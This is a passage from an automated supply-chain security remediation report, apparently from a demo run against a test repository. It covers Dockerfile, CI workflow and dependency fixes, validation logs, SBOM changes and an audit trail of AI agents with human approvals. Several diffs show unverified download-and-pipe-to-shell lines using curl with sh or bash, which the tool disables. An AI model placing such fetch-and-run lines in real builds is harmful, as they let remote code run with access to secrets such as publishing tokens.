- **Findings:** F-019 image fastbuilds42/node:latest is not an official / verified-publisher image (docker.io/fastbuilds42/node); F-032 image fastbuilds42/node:latest uses a mutable tag and no digest
- **Change:** latest → node:lts-slim@sha256:e6bedef217677b276c591795e169840edd9096dbf13f29df8ef8d1856b8820bc in `Dockerfile`
- **Why (verified facts):** Use the official Docker Hub image docker.io/library/node:lts-slim, pinned by digest, instead of fastbuilds42/node:latest (unverified publisher, mutable tag).
- **Advisor (AI inference):** F-019 flags fastbuilds42/node:latest as an unverified-publisher image and F-032 flags its mutable tag with no digest, so P-015 replaces it with the official docker.io/library/node:lts-slim pinned by digest; the packet shows no known advisories on the target. The trade-off is a runtime base image change (medium compatibility), which could alter the language runtime version and available OS packages used during the build.
- **Reviewer checklist (AI inference):** Verify the sha256 digest in the Dockerfile resolves to the intended node:lts-slim image and stays pinned in future builds. · Build the image and confirm the existing RUN step (including its curl-based bootstrap) still works with the packages present in the slim base. · Run the application smoke tests on the new base image to confirm the Node runtime version is compatible.
- **Expected risk reduction (estimate before validation):** resolves 2 finding(s); the image can no longer change silently
- **Compatibility:** medium: the runtime base image changes: check the language runtime version and OS packages
- **Rollback:** restore 'FROM fastbuilds42/node:latest' (not recommended)
- **Decision:** approve by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `8afa5712e390…`)
- **Validation (measured):** resolved (2/2 targeted findings resolved) · execution: built and started (the container answered)

```diff
--- a/Dockerfile
+++ b/Dockerfile
@@ -1,4 +1,4 @@
-FROM docker.io/fastbuilds42/node:latest
+FROM docker.io/library/node:lts-slim@sha256:e6bedef217677b276c591795e169840edd9096dbf13f29df8ef8d1856b8820bc
 WORKDIR /app
 COPY . .
 RUN curl -fsSL http://get.example.invalid/bootstrap.sh | sh
```

### P-016 · APPROVED · block · .github/workflows/ci.yml

- **Findings:** F-014 .github/workflows/ci.yml: job 'build' downloads a script and pipes it into a shell
- **Change:** - → - in `.github/workflows/ci.yml`
- **Why (verified facts):** Disable the download-and-execute step in .github/workflows/ci.yml: its content can change at any time and is not verified.
- **Advisor (AI inference):** P-016 disables the download-and-execute step in .github/workflows/ci.yml that F-014 flags as an unsafe install script, since the fetched content can change at any time and is unverified. The trade-off is medium compatibility: whatever the script set up will no longer happen, so the build may need a pinned, checksum-verified replacement rather than parity. No residual advisories are recorded for this change (residual_status checked).
- **Reviewer checklist (AI inference):** Confirm the build job still succeeds after the step is commented out, and identify what the script was installing so it can be replaced with a pinned, checksum- or signature-verified step. · Verify no downstream job or later step in ci.yml depends on artifacts or environment set up by the disabled curl|bash line. · Check that the NPM_TOKEN secret is not exposed by any remaining step in that block, and note the rollback rule: re-enable only with a checksum check.
- **Expected risk reduction (estimate before validation):** resolves 1 finding
- **Compatibility:** medium: whatever the script set up is no longer done
- **Rollback:** re-enable only with a checksum check
- **Decision:** approve by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `bf7d91ca8710…`)
- **Validation (measured):** resolved (1/1 targeted findings resolved) · execution: not executable locally (CI workflow): verified by the rescan only

```diff
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -19,6 +19,7 @@
           node-version: 18
       - uses: fastbuilds42/cache-helper@main
       - run: npm install
-      - run: curl -fsSL http://get.example.invalid/ci-agent.sh | bash
+      # SSCG: disabled unverified remote script. Download it, verify a pinned checksum or signature, then run it.
+      # - run: curl -fsSL http://get.example.invalid/ci-agent.sh | bash
         env:
           NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

### P-017 · NEEDS CHANGES · block · fastbuilds42/cache-helper

- **Findings:** F-015 .github/workflows/ci.yml: third-party action 'fastbuilds42/cache-helper@main' is not pinned to a commit SHA
- **Change:** - → - in `.github/workflows/ci.yml`
- **Why (verified facts):** The action fastbuilds42/cache-helper could not be resolved on GitHub (missing or private): remove this step from .github/workflows/ci.yml or replace it with a trusted action.
- **Expected risk reduction (estimate before validation):** -
- **Compatibility:** low: -
- **Rollback:** -
- **Notes:** removing a workflow step needs a human: later steps may depend on it
- **Decision:** request_changes by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `2c50d0fdad37…`)

### P-018 · APPROVED · mitigate · .github/workflows/ci.yml

- **Findings:** F-016 .github/workflows/ci.yml: workflow token has 'permissions: write-all'
- **Change:** - → - in `.github/workflows/ci.yml`
- **Why (verified facts):** Reduce the workflow token in .github/workflows/ci.yml from write-all to read-all; grant write permissions per job only where needed.
- **Advisor (AI inference):** P-018 mitigates F-016 by reducing the workflow token from write-all to read-all, limiting the blast radius of the overly permissive token. The trade-off is medium compatibility: any job that pushes, releases, or comments will break until an explicit per-job permission is granted. Residual status is checked with no residual advisories recorded.
- **Reviewer checklist (AI inference):** Run the workflow on a branch and confirm which jobs fail with permission errors, then add minimal per-job write permissions only where required. · Confirm the pull_request_target trigger combination with the reduced token does not still allow privileged operations from untrusted PR code. · Verify rollback is understood (restoring permissions: write-all) and that the change is documented in the repo's CI policy.
- **Expected risk reduction (estimate before validation):** resolves 1 finding
- **Compatibility:** medium: jobs that push, release or comment need an explicit per-job permission
- **Rollback:** restore 'permissions: write-all'
- **Decision:** approve by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `f82fd8025b48…`)
- **Validation (measured):** resolved (1/1 targeted findings resolved) · execution: not executable locally (CI workflow): verified by the rescan only

```diff
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -5,7 +5,7 @@
     branches: [main]
   pull_request_target:
 
-permissions: write-all
+permissions: read-all
 
 jobs:
   build:
```

### P-019 · APPROVED · block · Dockerfile

- **Findings:** F-017 Dockerfile downloads a script and pipes it into a shell
- **Change:** - → - in `Dockerfile`
- **Why (verified facts):** Disable the download-and-execute step in Dockerfile: its content can change at any time and is not verified.
- **Advisor (AI inference):** P-019 disables the Dockerfile download-and-execute line that F-017 identifies as an unsafe install script, removing an unverified network dependency from the image build. The trade-off is medium compatibility: whatever bootstrap.sh configured is no longer applied, so the image may fail to build or behave differently until a verified replacement is added. No residual advisories are recorded (residual_status checked).
- **Reviewer checklist (AI inference):** Build the image and confirm nothing after the disabled RUN line depends on what bootstrap.sh installed or configured. · Determine the script's purpose and add a pinned, checksum- or signature-verified replacement if it is still needed. · Confirm the base image docker.io/fastbuilds42/node:latest is itself intentionally pinned/tracked, since it is also mutable.
- **Expected risk reduction (estimate before validation):** resolves 1 finding
- **Compatibility:** medium: whatever the script set up is no longer done
- **Rollback:** re-enable only with a checksum check
- **Decision:** approve by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `3a60886cc177…`)
- **Validation (measured):** resolved (1/1 targeted findings resolved) · execution: built and started (the container answered)

```diff
--- a/Dockerfile
+++ b/Dockerfile
@@ -1,7 +1,8 @@
 FROM docker.io/fastbuilds42/node:latest
 WORKDIR /app
 COPY . .
-RUN curl -fsSL http://get.example.invalid/bootstrap.sh | sh
+# SSCG: disabled unverified remote script. Download it, verify a pinned checksum or signature, then run it.
+# RUN curl -fsSL http://get.example.invalid/bootstrap.sh | sh
 RUN npm install
 EXPOSE 3000
 CMD ["node", "src/index.js"]
```

### P-020 · APPROVED · upgrade · follow-redirects@1.13.0

- **Findings:** F-026 follow-redirects@1.13.0: 5 known vulnerabilities (highest HIGH, CVSS 8.0)
- **Change:** 1.13.0 → 1.16.2 in `package.json`
- **Why (verified facts):** Override the transitive copies follow-redirects 1.13.0 -> 1.16.2: fixes the 5 published advisories on 1.13.0; no known advisories remain on the target.
- **Advisor (AI inference):** P-020 upgrades the transitive follow-redirects from 1.13.0 to 1.16.2 via a package.json override, addressing F-026's 5 known vulnerabilities (highest HIGH, CVSS 8.0); the planner reports no known advisories remain on the target. The trade-off is a minor version change (1.13.0 to 1.16.2) requiring a regenerated lockfile and re-validation of dependent packages. Residual status is checked against the target with no residual advisories listed.
- **Reviewer checklist (AI inference):** Run the full test suite plus any HTTP client/redirect handling tests, since follow-redirects is a transitive dependency used by other packages. · Verify the regenerated package-lock.json resolves follow-redirects to 1.16.2 everywhere (npm ls follow-redirects) and that no nested copy still resolves to 1.13.0. · Confirm the overrides entry does not conflict with other dependency constraints, and note rollback by reverting the commit to restore 1.13.0.
- **Expected risk reduction (estimate before validation):** expected: the 5 advisories of 1.13.0 are fixed in 1.16.2; 0 other advisory(ies) on 1.16.2 · targets 1 finding(s)
- **Compatibility:** medium: minor version change (1.13.0 -> 1.16.2)
- **Rollback:** restore follow-redirects 1.13.0 in package.json (and the lockfile) by reverting the remediation commit
- **Decision:** approve by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `8b6ace29a667…`)
- **Validation (measured):** resolved (1/1 targeted findings resolved) · execution: built and started (the container answered)

```diff
--- a/package.json
+++ b/package.json
@@ -16,5 +16,8 @@
   "license": "MIT",
   "devDependencies": {
     "crossenv": "7.0.3"
+  },
+  "overrides": {
+    "follow-redirects": "1.16.2"
   }
 }
# + package-lock.json regenerated from the registry during validation (npm --package-lock-only)
```

## 4. Validation: build, test and rescan

- **Where:** a temporary copy `C:\Users\VICTUS\AppData\Local\Temp\sscg-validate-9318e5fb7ab5` of the repository with the approved edits. Commands run as local processes with secrets removed from the environment and npm install scripts disabled; this is not an isolated sandbox.
- **Docker:** engine running: images were built (and removed afterwards)
- **What was rescanned:** source of the remediated copy (manifests, lockfiles, Dockerfiles, CI workflows) with the same detection pipeline as the original scan; and the built container image(s) ./Dockerfile with Trivy (OS and language packages)
- **Vulnerability lookup in the rescan:** complete
- **Built image scan (after, ./Dockerfile, aquasec/trivy:0.58.1):** debian 13.7, 260 packages; vulnerabilities: critical 0, high 58, medium 112, low 79
  - HIGH CVE-2026-76642 in bsdutils 1:2.41.5-0+deb13u1 (no fix published)
  - HIGH CVE-2026-78408 in bsdutils 1:2.41.5-0+deb13u1 (no fix published)
  - HIGH CVE-2026-78409 in bsdutils 1:2.41.5-0+deb13u1 (no fix published)
  - HIGH CVE-2026-78410 in bsdutils 1:2.41.5-0+deb13u1 (no fix published)
  - HIGH CVE-2026-54369 in libacl1 2.3.2-2+b1 (no fix published)
- **Controlled branch:** `sscg/remediation-9318e5fb7ab5` (commit `df6cc78f552d` on `8cad42ed8b39`), 6 file(s); exported as `remediation/remediation.bundle` (`git fetch <path>/remediation.bundle sscg/remediation-9318e5fb7ab5`). Nothing was pushed or merged.

| Step | Kind | Before (unchanged) | After (remediated) | Compared with the baseline | Time |
|---|---|---|---|---|---|
| regenerate lockfile (.) | relock | - | ok | ok | 2.5s |
| docker build (./Dockerfile) | image | failed | ok | fixed by the change | 1.5s |
| smoke run (./Dockerfile) | smoke | - | ok | ok | 1.4s |
| mvn test (notifier) | build | ok | ok | ok | 3.7s |
| npm ci (.) | install | failed | ok | fixed by the change | 2.0s |
| pip install -r requirements.txt (worker) | install | failed | ok | fixed by the change | 5.2s |
| compile check (worker) | compile | - | ok | ok | 0.1s |

**Log tail: before: docker build (./Dockerfile) (failed)**

```
Dockerfile:1
--------------------
   1 | >>> FROM docker.io/fastbuilds42/node:latest
   2 |     WORKDIR /app
   3 |     COPY . .
--------------------
ERROR: failed to solve: docker.io/fastbuilds42/node:latest: failed to resolve source metadata for docker.io/fastbuilds42/node:latest: pull access denied, repository does not exist or may require authorization: server message: insufficient_scope: authorization failed
View build details: docker-desktop://dashboard/build/desktop-linux/desktop-linux/mm05x0nvzuj112o5lhmazhjkd
```

**Log tail: before: npm ci (.) (failed)**

```
npm error code E404
npm error 404 Not Found - GET https://registry.npmjs.org/crossenv/-/crossenv-7.0.3.tgz - Not found
npm error 404
npm error 404  'crossenv@https://registry.npmjs.org/crossenv/-/crossenv-7.0.3.tgz' is not in this registry.
npm error 404
npm error 404 Note that you can also install from a
npm error 404 tarball, folder, http url, or git url.
npm error A complete log of this run can be found in: C:\Users\VICTUS\AppData\Roaming\npm-cache\_logs\2026-11-24T06_29_05_348Z-debug-0.log
```

**Log tail: before: pip install -r requirements.txt (worker) (failed)**

```
ERROR: Ignored the following yanked versions: 6.0.2rc1
ERROR: Could not find a version that satisfies the requirement PyYAML==5.3 (from versions: 6.0.1, 6.0.2, 6.0.3, 6.0.4)
ERROR: No matching distribution found for PyYAML==5.3
```

**SBOM before → after:** 14 changed · 39 added · 5 removed

- changed: maven:com.fasterxml.jackson.core:jackson-annotations 2.9.0 -> 2.18.11
- changed: maven:com.fasterxml.jackson.core:jackson-core 2.9.8 -> 2.18.11
- changed: maven:com.fasterxml.jackson.core:jackson-databind 2.9.8 -> 2.18.11
- changed: maven:org.apache.commons:commons-lang3 3.11 -> 3.12.0
- changed: maven:org.apache.commons:commons-text 1.9 -> 1.10.0
- changed: maven:org.apache.logging.log4j:log4j-api 2.14.1 -> 2.25.4
- changed: maven:org.apache.logging.log4j:log4j-core 2.14.1 -> 2.25.4
- changed: maven:org.osgi:org.osgi.core 4.3.1 -> 6.0.0
- changed: npm:axios 0.21.0 -> 0.34.0
- changed: npm:follow-redirects 1.13.0 -> 1.16.2
- changed: npm:lodash 4.17.15 -> 4.18.1
- changed: npm:minimist 0.0.8 -> 0.2.4
- changed: pypi:jinja2 2.10.0 -> 3.1.6
- changed: pypi:pyyaml 5.3.0 -> 6.0.1
- added: docker:docker.io/library/node@sha256:e6bedef217677b276c591795e169840edd9096dbf13f29df8ef8d1856b8820bc
- added: maven:biz.aQute.bnd:biz.aQute.bnd.annotation@7.1.0
- added: maven:com.google.errorprone:error_prone_annotations@2.38.0
- added: maven:org.jspecify:jspecify@1.0.0
- added: maven:org.osgi:org.osgi.annotation.bundle@2.0.0
- added: maven:org.osgi:org.osgi.annotation.versioning@1.1.2
- added: maven:org.osgi:org.osgi.resource@1.0.0
- added: maven:org.osgi:org.osgi.service.serviceloader@1.0.0
- added: npm:@epic-web/invariant@1.0.0
- added: npm:asynckit@0.4.0
- added: npm:call-bind-apply-helpers@1.0.2
- added: npm:combined-stream@1.0.8
- added: npm:cross-env@10.1.0
- added: npm:cross-spawn@7.0.6
- added: npm:delayed-stream@1.0.0
- removed: docker:docker.io/fastbuilds42/node@latest
- removed: npm:crossenv@7.0.3
- removed: pypi:python3-dateutil@2.8.1
- removed: url:http://get.example.invalid/bootstrap.sh@
- removed: url:http://get.example.invalid/ci-agent.sh@

**Resolved findings:** F-001, F-003, F-004, F-005, F-006, F-007, F-008, F-009, F-010, F-011, F-012, F-013, F-014, F-016, F-017, F-019, F-020, F-021, F-023, F-024, F-025, F-026, F-027, F-031, F-032, F-033, F-034, F-041

**Vulnerabilities NOT resolved: the package moved to a new version that keeps the same advisories:**

- F-036 org.apache.commons:commons-lang3@3.11: GHSA-j288-q9x7-2f5v
- F-038 org.apache.logging.log4j:log4j-api@2.14.1: GHSA-qv9r-c865-cp47

**Findings that exist only after the change:**

- other advisories on the new version · Medium: org.apache.logging.log4j:log4j-api@2.25.4: 1 known vulnerability (highest MEDIUM) (VULN)
- expected (e.g. the replacement package) · Medium: new prod dependency python-dateutil@4.0.0 added in worker/requirements.txt (R08_UNEXPECTED_DEPENDENCY)
- expected (e.g. the replacement package) · Medium: new dev dependency cross-env@10.1.0 added in package.json (R08_UNEXPECTED_DEPENDENCY)
- other advisories on the new version · High: org.apache.commons:commons-lang3@3.12.0: 1 known vulnerability (highest MEDIUM, CVSS 6.5) (VULN)

**Machine-readable evidence:** before: `findings.json`, `sbom.cdx.json` · after: `remediation/after/findings.json`, `remediation/after/sbom.cdx.json` · validation details: `remediation/remediation.json`

## 5. Remaining and accepted risk

Measured after the change: **15 finding(s)** = 13 original finding(s) still present + 4 finding(s) that only exist after the change (section 4). Highest remaining: F-002 (P1), F-018 (P1), F-015 (P1), F-028 (P1), F-022 (P2), F-029 (P2), F-035 (P2), F-037 (P2).
- needs changes: P-010 escalate review .github/workflows/ci.yml (Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer)
- needs changes: P-011 escalate review .github/workflows/ci.yml (Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer)
- needs changes: P-014 escalate review  (Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer)
- needs changes: P-017 block fastbuilds42/cache-helper (Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer)

**Next step (retry):** a finished run cannot be approved again. Start a new run and decide again:

```
python -m sscg agent C:\Users\VICTUS\Desktop\Bosch Hack\targets\sscg-demo-target --remediate --decisions later
python -m sscg approve C:\Users\VICTUS\Desktop\Bosch Hack\targets\sscg-demo-target --approve <ids> --by "<name>"
```

## 6. Audit trail

- Knowledge base `7f4bce14289a` · AI engine deepseek:deepseek-flash · nothing was merged, deployed or released; the original repository was not modified.
- Approvals are bound to a fingerprint of the reviewed files (manifests, lockfiles, Dockerfiles, workflows, edited files): a changed repository is refused at resume. Source fingerprint `9492efd329705979…`.

| Agent / step | Kind | Status | Seconds | Tokens in/out |
|---|---|---|---|---|
| Orchestrator | deterministic | ok | 0.05 | 0/0 |
| Discovery | deterministic | ok | 0.02 | 0/0 |
| Vulnerability Intel | deterministic | ok | 0.05 | 0/0 |
| Detection | deterministic | ok | 0.25 | 0/0 |
| Evidence Gatherer | deterministic | ok | 0.15 | 0/0 |
| Triage | llm | ok | 11.99 | 3235/1883 |
| Triage | llm | ok | 5.49 | 3014/798 |
| Triage | llm | ok | 5.37 | 2795/812 |
| Triage | llm | ok | 8.69 | 2344/1392 |
| Triage | llm | ok | 8.79 | 2414/1444 |
| Triage | llm | ok | 7.07 | 2919/1141 |
| Triage | llm | ok | 7.17 | 3144/1086 |
| Triage | llm | ok | 10.81 | 2337/1687 |
| Triage | llm | ok | 4.3 | 3223/733 |
| Triage | llm | ok | 5.69 | 2999/820 |
| Triage | llm | ok | 11.62 | 2881/2036 |
| Triage | llm | ok | 5.2 | 2762/848 |
| Triage | deterministic | ok | 0.0 | 0/0 |
| Evidence Gatherer | deterministic | ok | 0.01 | 0/0 |
| Triage | llm | ok | 12.81 | 2421/1277 |
| Triage | llm | ok | 5.41 | 2520/782 |
| Triage | llm | ok | 7.28 | 3104/1087 |
| Triage | llm | ok | 10.28 | 2990/1801 |
| Triage | deterministic | ok | 0.0 | 0/0 |
| Narrator | llm | ok | 17.35 | 4950/2063 |
| Reporter | deterministic | ok | 1.4 | 0/0 |
| Exploit Intel | deterministic | ok | 0.01 | 0/0 |
| Reachability | deterministic | ok | 0.01 | 0/0 |
| Prioritizer | deterministic | ok | 0.0 | 0/0 |
| Remediation | deterministic | ok | 0.09 | 0/0 |
| Remediation Advisor | llm | ok | 33.42 | 7726/4139 |
| Human Approval | human | ok | 0.06 | 0/0 |
| Validation | deterministic | ok | 59.28 | 0/0 |
| Human approval | human | approve P-001 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | approve P-002 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | approve P-003 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | approve P-004 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | approve P-005 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | approve P-006 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | approve P-007 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | approve P-008 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | approve P-009 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | approve P-012 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | approve P-013 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | approve P-015 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | approve P-016 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | approve P-018 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | approve P-019 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | approve P-020 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | request_changes P-010 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | request_changes P-011 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | request_changes P-014 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
| Human approval | human | request_changes P-017 by Ghanashyam (demo approver) | 2026-11-24T06:28:57+00:00 | |
